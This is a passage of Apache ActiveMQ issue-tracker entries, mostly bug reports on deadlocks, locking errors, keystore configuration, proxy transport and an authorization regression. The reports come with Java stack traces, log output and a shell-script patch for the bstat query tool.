org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:564) at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:558) at org.apache.activemq.store.ProxyTopicMessageStore.recover(ProxyTopicMessageStore.java:62) at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:589) at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65) at org.apache.activemq.broker.region.Topic$6.run(Topic.java:722) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505)
issueID:AMQ-5784
type:Bug
changed files:WSServlet.java
texts:Jetty9 websockets dont work with mqtt
activemq in combination with jetty9 does not work for websockets + mqtt.patch: http://pastebin.com/phcsJHR5I tested with the chat example coming with activemq with all browsers.
issueID:AMQ-5785
type:Bug
changed files:FilePendingMessageCursor.java
texts:Deadlock between FilePendingMessageCursor usage change and incoming send operations.
During the peak loads we are encountering a recurring deadlock issue in ActiveMQ broker. The threads that are deadlocked are ActiveMQ  NIO Worker - trying to add message to FilePendingCursorBroker.Service Worker - that is trying to expire message from FilePendingCursor.=============================Found one Java-level deadlock:============================="ActiveMQ NIO Worker 1003":  waiting to lock monitor 0x00002aeeb515a4f8 (object 0x00000007807da3e8, a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor),  which is held by "ActiveMQ BrokerService.worker.1""ActiveMQ BrokerService.worker.1":  waiting for ownable synchronizer 0x000000077ac84b40, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ActiveMQ NIO Worker 1003"Java stack information for the threads listed above:==================================================="ActiveMQ NIO Worker 1003": at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:207) waiting to lock <0x00000007807da3e8> (a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor) at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) locked <0x00000007784e8c88> (a org.apache.activemq.broker.region.cursors.StoreQueueCursor) at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1855) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:939) at org.apache.activemq.broker.region.Queue.send(Queue.java:733) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:424) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:297) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:307) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147) at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:152) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:496) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:756) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ BrokerService.worker.1": at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x000000077ac84b40> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197) at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:945) at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1841) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.discardExpiredMessage(FilePendingMessageCursor.java:474) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.expireOldMessages(FilePendingMessageCursor.java:420) locked <0x00000007807da3e8> (a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:398) locked <0x00000007807da3e8> (a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor) at org.apache.activemq.usage.Usage$1.run(Usage.java:304) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)
issueID:AMQ-5787
type:Bug
changed files:VMTransport.java
texts:VMTransport uses broken double checked locking
the VMTransport.getMessageQueue() method uses the "double checked locking" idiom to avoid the synchronization overhead if the messageQueue has already been instantiated.  however, this idiom is broken unless the reference is marked as volatile.
issueID:AMQ-5789
type:Improvement
changed files:
texts:ActiveMQSslConnectionFactory hardcodes the KeyStore type
The issue is present in earlier versions but only 5.10.x and up are maintained right now. At the very minimum we should use KeyStore.getDefaultType() but even that is not sufficient, as one may use a different keystore type (such as pkcs12, bks, keychain on osx, etc) and it should be configurable. The default should be getDefaultType, as defined in java.security (which is by default, jks, so there shouldn"t be any impact on current users).I am testing a patch should be able to commit it in a day or two.
issueID:AMQ-579
type:Bug
changed files:
texts:bstat does not pass along settings, like the jmxuri, to the underlying query.  Patch enclosed.
Problem:---> scott@jvlinux (0.01)$ ./bstat localhost  --jmxurl service:jmx:rmi:///jndi/rmi://localhost:11099/jmxrmiACTIVEMQ_HOME: /opt/apps/activemqERROR: java.lang.RuntimeException: Failed to execute query task. Reason: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException &#91;Root exception is java.rmi.ConnectIOException: non-JRMP server at remote endpoint&#93;ERROR: java.lang.Exception: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException &#91;Root exception is java.rmi.ConnectIOException: non-JRMP server at remote endpoint&#93;but the query does work:---> scott@jvlinux (0.08)$ ./query --jmxurl service:jmx:rmi:///jndi/rmi://localhost:11099/jmxrmi --objname Type=,BrokerName=localhost -xQTopic=ActiveMQ.Advisory. --view Type,BrokerName,Destination,ConnectorName,EnqueueCount,DequeueCount,TotalEnqueueCount,TotalDequeueCount,Messages,TotalMessages,ConsumerCount,TotalConsumerCount,DispatchQueueSizeACTIVEMQ_HOME: /opt/apps/activemqTotalConsumerCount = 4Type = BrokerTotalMessages = 3<and more>Fix:Change bstatBROKER_NAME=$1if [ -z "$BROKER_NAME" ] ; then    BROKER_NAME="*"fi Select all components that belongs to the specified broker except advisory topics and display the specified attributesQUERY_PARAM="--objname Type=,BrokerName=${BROKER_NAME} -xQTopic=ActiveMQ.Advisory. --view Type,BrokerName,Destination,ConnectorName,EnqueueCount,DequeueCount,TotalEnqueueCount,TotalDequeueCount,Messages,TotalMessages,ConsumerCount,TotalConsumerCount,DispatchQueueSize"if [ -n "$CYGHOME" ]; then    exec "$JAVACMD" $ACTIVEMQ_DEBUG_OPTS $ACTIVEMQ_OPTS -classpath "" -Dactivemq.home="${ACTIVEMQ_HOME}" -Dcygwin.user.home="$CYGHOME" -jar ${ACTIVEMQ_HOME}/bin/run.jar $ACTIVEMQ_TASK $QUERY_PARAMelse    exec "$JAVACMD" $ACTIVEMQ_DEBUG_OPTS $ACTIVEMQ_OPTS -classpath "" -Dactivemq.home="${ACTIVEMQ_HOME}" -jar ${ACTIVEMQ_HOME}/bin/run.jar $ACTIVEMQ_TASK $QUERY_PARAMfitoBROKER_NAME=$1if [ -z "$BROKER_NAME" ] ; then    BROKER_NAME="*"fishiftOTHER_OPTS=$@if [ -z "$OTHER_OPTS" ] ; then    OTHER_OPTS=""fi Select all components that belongs to the specified broker except advisory topics and display the specified attributesQUERY_PARAM="--objname Type=,BrokerName=${BROKER_NAME} -xQTopic=ActiveMQ.Advisory. --view Type,BrokerName,Destination,ConnectorName,EnqueueCount,DequeueCount,TotalEnqueueCount,TotalDequeueCount,Messages,TotalMessages,ConsumerCount,TotalConsumerCount,DispatchQueueSize"if [ -n "$CYGHOME" ]; then    exec "$JAVACMD" $ACTIVEMQ_DEBUG_OPTS $ACTIVEMQ_OPTS -classpath "" -Dactivemq.home="${ACTIVEMQ_HOME}" -Dcygwin.user.home="$CYGHOME" -jar ${ACTIVEMQ_HOME}/bin/run.jar $ACTIVEMQ_TASK $QUERY_PARAM $OTHER_OPTSelse    exec "$JAVACMD" $ACTIVEMQ_DEBUG_OPTS $ACTIVEMQ_OPTS -classpath "" -Dactivemq.home="${ACTIVEMQ_HOME}" -jar ${ACTIVEMQ_HOME}/bin/run.jar $ACTIVEMQ_TASK $QUERY_PARAM $OTHER_OPTSfi
issueID:AMQ-5791
type:Test
changed files:
texts:patch for test: testSelectorsAndNonSelectors()
Hello,I have created a patch for TwoBrokerVirtualTopicSelectorAwareForwardingTest.testSelectorsAndNonSelectors() test that was failing in many recent Java 8 builds. (for example https://builds.apache.org/job/ActiveMQ-Java8/org.apache.activemq$activemq-unit-tests/358/#showFailuresLink)The problem was that there was too little time for consumers to consume all messages and therefore the asserts failed. Vladimir Caniga
issueID:AMQ-5792
type:New Feature
changed files:
texts:Add a SubscriptionStatistics implementation to Subscriptions
I think it would be a good idea to create a SubscriptionStatistics class following the same model as DestinationStatistics.  There are already several counters/metrics tracked per subscription that could be moved into this new metrics class.  Accessing the values programmatically would benefit because it would it is easier to just call a single gettter and receive a SubscriptionStatistics object versus having to call several getters to get individual values.A future enhancement after this issue is complete is to expand the metrics and add new ones.  For example, an inflight count is kept but it would also be nice to keep track of the total byte size of the inflight messages as well.  I will be working on a pull request for this over the next couple of days and I will push it up when it is done.
issueID:AMQ-5793
type:Bug
changed files:
texts:swiss army knife example broken
Wrong value of activemq.home property in swissarmy/build.xml file
issueID:AMQ-5794
type:Improvement
changed files:AbstractInactivityMonitor.java
texts:Cleanup connections that open but don&#39;t initiate a protocol handshake.
The current inactivity monitor implementation only kicks in when the connection is opened an the protocol handshake completes such as when an OpenWire client sends its WireFormatInfo or when a STOMP client sends the CONNECT frame.We currently deal with this case for AMQP and MQTT by using a connection attempt timeout to close down connections that have opened but not started a handshake.  We should extend this to STOMP and OpenWire as well.  This issue has been seen in the STOMP over websockets where a STOMP WebSocket connection is opened but for some reason never initiates.
issueID:AMQ-5795
type:Improvement
changed files:
texts:AMQP: Allow delivery transformer to fallback to lower level transformer when transformation fails
If a client sends an AMQP that cannot be transformed using the configured transformer the broker shouldn"t drop the message, instead it should attempt to fall-back to a less aggressive transformer.  An example would be a broker configured to use the JMS transformer and the incoming message contains a body consisting of a DescribedType.  The JMS Transformer would fail as there is no direct way to map that into a JMS message type.  We could in this case fallback to the Native transformer and still process the message.  An OpenWire client for instance would just receive a BytesMessage while other AMQP clients would get the message in the form it was sent.This allows the message to round-trip for instance from AMQP -> OpenWire -> OpenWire -> AMQP (Broker network bridge) without losing its original payload or message properties.
issueID:AMQ-5796
type:Bug
changed files:AmqBrowseCommand.java
texts:Incorrect Task Usage mentioned for amq browse command for the msgsel
The "megsel" usage help mentioned in the activemq browse command does not put the message selector value in the Double quatation mark which is causing the users following error.[jsensharma@localhost bin]$ cd apache-activemq-5.11.1/bin[jsensharma@localhost bin]$ ./activemq-admin browse --amqurl tcp://localhost:61616 --msgsel JMSMessageID="*:1" FOO.BARERROR: java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.InvalidSelectorException: (JMSMessageID=*:1)java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.InvalidSelectorException: (JMSMessageID=*:1) at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:155) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.activemq.console.Main.runTaskClass(Main.java:262) at org.apache.activemq.console.Main.main(Main.java:115)ERROR: java.lang.Exception: javax.jms.InvalidSelectorException: (JMSMessageID=*:1)java.lang.Exception: javax.jms.InvalidSelectorException: (JMSMessageID=*:1) at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:156) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.activemq.console.Main.runTaskClass(Main.java:262) at org.apache.activemq.console.Main.main(Main.java:115)Caused by: javax.jms.InvalidSelectorException: (JMSMessageID=*:1) at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:88) at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:58) at org.apache.activemq.ActiveMQQueueBrowser.<init>(ActiveMQQueueBrowser.java:80) at org.apache.activemq.ActiveMQSession.createBrowser(ActiveMQSession.java:1449) at org.apache.activemq.console.filter.AmqMessagesQueryFilter.queryMessages(AmqMessagesQueryFilter.java:104) at org.apache.activemq.console.filter.AmqMessagesQueryFilter.query(AmqMessagesQueryFilter.java:86) at org.apache.activemq.console.filter.WildcardTransformFilter.query(WildcardTransformFilter.java:60) at org.apache.activemq.console.util.AmqMessagesUtil.getMessages(AmqMessagesUtil.java:60) at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:142) ... 10 moreCaused by: org.apache.activemq.selector.ParseException: Parse error at line 1, column 15.  Encountered: * at org.apache.activemq.selector.SelectorParser.generateParseException(SelectorParser.java:1313) at org.apache.activemq.selector.SelectorParser.jj_consume_token(SelectorParser.java:1261) at org.apache.activemq.selector.SelectorParser.unaryExpr(SelectorParser.java:474) at org.apache.activemq.selector.SelectorParser.multExpr(SelectorParser.java:391) at org.apache.activemq.selector.SelectorParser.addExpression(SelectorParser.java:360) at org.apache.activemq.selector.SelectorParser.comparisonExpression(SelectorParser.java:212) at org.apache.activemq.selector.SelectorParser.equalityExpression(SelectorParser.java:172) at org.apache.activemq.selector.SelectorParser.andExpression(SelectorParser.java:136) at org.apache.activemq.selector.SelectorParser.orExpression(SelectorParser.java:115) at org.apache.activemq.selector.SelectorParser.primaryExpr(SelectorParser.java:537) at org.apache.activemq.selector.SelectorParser.unaryExpr(SelectorParser.java:471) at org.apache.activemq.selector.SelectorParser.multExpr(SelectorParser.java:391) at org.apache.activemq.selector.SelectorParser.addExpression(SelectorParser.java:360) at org.apache.activemq.selector.SelectorParser.comparisonExpression(SelectorParser.java:212) at org.apache.activemq.selector.SelectorParser.equalityExpression(SelectorParser.java:157) at org.apache.activemq.selector.SelectorParser.andExpression(SelectorParser.java:136) at org.apache.activemq.selector.SelectorParser.orExpression(SelectorParser.java:115) at org.apache.activemq.selector.SelectorParser.JmsSelector(SelectorParser.java:107) at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:85) ... 18 more
issueID:AMQ-5799
type:Improvement
changed files:
texts:AMQP: Return a more complete Source when client looks up an existing durable subscription
When a client is looking up an existing durable subscription to resubscribe we need to return a Source instance that contains as much of the original information used to create the durable sub.  Things like noLocal flag and selector used should be returned to the client so that it can validate its request against the subscription that it is attempting to make and fail or otherwise respond if the old one does not match its expectations.
issueID:AMQ-5801
type:Sub-task
changed files:
texts:AMQP: add a hint to the error condition to signal that container-id was the invalid field when clientid is in use
For the JMS mapping, we will be using container-id to carry the client id. When the broker rejects a connection because the clientid is in use, it does this with an invalid field error condition. In order to let the client know it is the clientid specifically, we need to add a hint to the error condition to indicate this.To do this, we will add an info map with an "invalid-field" symbol key, mapping to the symbolic name of the field in the Open frame that was considered invalid, in this case "container-id".
issueID:AMQ-5804
type:Bug
changed files:HttpClientTransport.java
texts:Using https transport with http proxy
After specifying connection url like:https://address:443?proxyHost=192.168.1.1&proxyPort=80I got exception Scheme "http" not registeredIt happens because default schema for proxy is http,but when we uses https address it registers only https schema in HttpsClientTransport
issueID:AMQ-5811
type:Bug
changed files:
texts:NoSuchElementException during resource adapter shutdown in EAP 6
After deploying activemq-rar to EAP 6 and starting the server, it sometimes gives NoSuchElementException during shutdown, like:17:06:12,471 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1) Exception in thread "ResourceAdapterDeploymentService Thread Pool &#8211; 1" java.util.NoSuchElementException17:06:12,475 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at java.util.HashMap$HashIterator.nextEntry(HashMap.java:925)17:06:12,475 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at java.util.HashMap$KeyIterator.next(HashMap.java:956)17:06:12,475 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at org.apache.activemq.ra.ActiveMQResourceAdapter.stop(ActiveMQResourceAdapter.java:152)17:06:12,478 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at org.jboss.as.connector.services.resourceadapters.deployment.AbstractResourceAdapterDeploymentService.unregisterAll(AbstractResourceAdapterDeploymentService.java:188)17:06:12,478 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at org.jboss.as.connector.services.resourceadapters.deployment.ResourceAdapterXmlDeploymentService.unregisterAll(ResourceAdapterXmlDeploymentService.java:155)17:06:12,479 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at org.jboss.as.connector.services.resourceadapters.deployment.AbstractResourceAdapterDeploymentService$2.run(AbstractResourceAdapterDeploymentService.java:299)17:06:12,480 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)17:06:12,480 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)17:06:12,480 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at java.lang.Thread.run(Thread.java:745)17:06:12,480 ERROR &#91;stderr&#93; (ResourceAdapterDeploymentService Thread Pool &#8211; 1)  at org.jboss.threads.JBossThread.run(JBossThread.java:122)
issueID:AMQ-5813
type:Bug
changed files:
texts:TopicSubscriptions report a negative countBeforeFull statistic
The countBeforeFull method that is part of Subscription is supposed to return the number of messages that the subscription can accept before it is full.  This works fine for Durables and Queues (Prefetch subscriptions) where the value is a positive value when it can accept more messages.  Usually the value will report the size of prefetch minus any prefetch extension and dispatchedQueueSize.However, for a TopicSubscription this value is reversed and it is subtracting prefetch from dispatchedQueueSize.  For example, if the prefetch policy is set at 1000, this method will report "-1000" when calling countBeforeFull.
issueID:AMQ-5814
type:Bug
changed files:
texts:Wrong with role-based authorization when using right permission
Since version 5.10, the problem has been caused by broker. It was behaving wrong with role-based authorization. I have configured right SimpleAuthorization plugin but no luck.  I guess it has problem from AMQ-5160 Here my test cases on github, please review and let me know if you have any questions: https://github.com/hongphu8790/activemq/tree/master/mqtt-authorization-testProject test-case descriptions: Using debug mode for broker to view detailproblem. Repeat with pom.xml file+ With AMQ 5.9.1 (it will pass all test cases)+ With AMQ >= 5.10.0 (it will pass only test cases with using publisher have super permissionHere my log occurred when the test case failed:Log debug mode - activemq.log2015-05-29 10:30:24,746 | DEBUG | AbstractRegion                 | Subscription denied for TopicSubscription: consumer=ID:XXXXXX-50828-1432870224218-2:2:-1:1, destinations=0, dispatched=0, delivered=0, matched=0, discarded=0 to destination topic://dcu.id: User publisher is not authorized to read from: topic://dcu.id
issueID:AMQ-5815
type:Bug
changed files:PageFile.java
texts:Frequency IOException cast dead lock while using kahadb in high concurrency environment
When the concurrency is in high level, iops more than 3000/s, we find that most of the amq connections are blocked.We can"t either get or push any data through them unless restart.This issue appears frequency.There is many IOExceptions in the amq logs.2015-05-28 00:37:08,544 | ERROR | Checkpoint failed | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Workerjava.io.IOException: Input/output error        at java.io.RandomAccessFile.write(Native Method)[:1.6.0_30]        at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)[:1.6.0_30]        at org.apache.activemq.util.RecoverableRandomAccessFile.writeLong(RecoverableRandomAccessFile.java:305)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.PageFile.writeBatch(PageFile.java:1062)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.PageFile.flush(PageFile.java:516)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1512)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase$17.execute(MessageDatabase.java:1484)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1481)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:929)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:357)[activemq-kahadb-store-5.10.0.jar:5.10.0]2015-05-28 00:37:08,547 | INFO  | Ignoring IO exception, java.io.IOException: Input/output error | org.apache.activemq.util.DefaultIOExceptionHandler | ActiveMQ Journal Checkpoint Workerjava.io.IOException: Input/output error        at java.io.RandomAccessFile.write(Native Method)[:1.6.0_30]        at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)[:1.6.0_30]        at org.apache.activemq.util.RecoverableRandomAccessFile.writeLong(RecoverableRandomAccessFile.java:305)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.PageFile.writeBatch(PageFile.java:1062)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.PageFile.flush(PageFile.java:516)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1512)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase$17.execute(MessageDatabase.java:1484)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1481)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:929)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:357)[activemq-kahadb-store-5.10.0.jar:5.10.0]2015-05-28 00:37:08,580 | INFO  | KahaDB: Recovering checkpoint thread after death | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///10.40.50.31:58171@616162015-05-28 00:37:17,285 | INFO  | Journal failed while writing at: 2359276 | org.apache.activemq.store.kahadb.disk.journal.DataFileAppender | ActiveMQ Data File Writer2015-05-28 00:37:17,287 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///10.40.50.17:4487@61616java.io.IOException: Input/output error        at sun.nio.ch.FileChannelImpl.force0(Native Method)[:1.6.0_30]        at sun.nio.ch.FileChannelImpl.force(FileChannelImpl.java:348)[:1.6.0_30]        at org.apache.activemq.util.RecoverableRandomAccessFile.sync(RecoverableRandomAccessFile.java:402)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.processQueue(DataFileAppender.java:373)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender$1.run(DataFileAppender.java:193)[activemq-kahadb-store-5.10.0.jar:5.10.0]2015-05-28 00:37:17,291 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///10.40.50.17:4442@61616java.io.IOException: Input/output error        at sun.nio.ch.FileChannelImpl.force0(Native Method)[:1.6.0_30]        at sun.nio.ch.FileChannelImpl.force(FileChannelImpl.java:348)[:1.6.0_30]        at org.apache.activemq.util.RecoverableRandomAccessFile.sync(RecoverableRandomAccessFile.java:402)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.processQueue(DataFileAppender.java:373)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender$1.run(DataFileAppender.java:193)[activemq-kahadb-store-5.10.0.jar:5.10.0]2015-05-28 00:37:17,293 | INFO  | Ignoring IO exception, java.io.IOException: Input/output error | org.apache.activemq.util.DefaultIOExceptionHandler | ActiveMQ Transport: tcp:///10.40.50.17:4442@61616java.io.IOException: Input/output error        at sun.nio.ch.FileChannelImpl.force0(Native Method)[:1.6.0_30]        at sun.nio.ch.FileChannelImpl.force(FileChannelImpl.java:348)[:1.6.0_30]        at org.apache.activemq.util.RecoverableRandomAccessFile.sync(RecoverableRandomAccessFile.java:402)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender.processQueue(DataFileAppender.java:373)[activemq-kahadb-store-5.10.0.jar:5.10.0]        at org.apache.activemq.store.kahadb.disk.journal.DataFileAppender$1.run(DataFileAppender.java:193)[activemq-kahadb-store-5.10.0.jar:5.10.0]With the aid of jstack ,we find dead lock(How can I upload the whole jtack log?)The blocked connections are all waiting for 0x00007f90500034e0[01:08:01] "ActiveMQ Transport: tcp:///10.40.50.17:4479@61616" daemon prio=10 tid=0x00007f8f8c015000 nid=0x2ece waiting for monitor entry [0x00007f8f1f6e4000][01:08:01]    java.lang.Thread.State: BLOCKED (on object monitor)[01:08:01]         at org.apache.activemq.transaction.LocalTransaction.rollback(LocalTransaction.java:94)[01:08:01]         - waiting to lock <0x00007f90500034e0> (a org.apache.activemq.store.kahadb.KahaDBTransactionStore)[01:08:01]         at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:74)[01:08:01]         at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:253)[01:08:01]         at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:112)[01:08:01]         at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:453)[01:08:01]         at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)[01:08:01]         at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)[01:08:01]         at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148)[01:08:01]         at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)[01:08:01]         at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)[01:08:01]         at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)[01:08:01]         at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)[01:08:01]         at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)[01:08:01]         at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)[01:08:01]         at java.lang.Thread.run(Thread.java:662)Only one connection(Thread) get this lock.But it is waiting for another Read lock 0x00007f90530ed8d8[01:08:01] "ActiveMQ Transport: 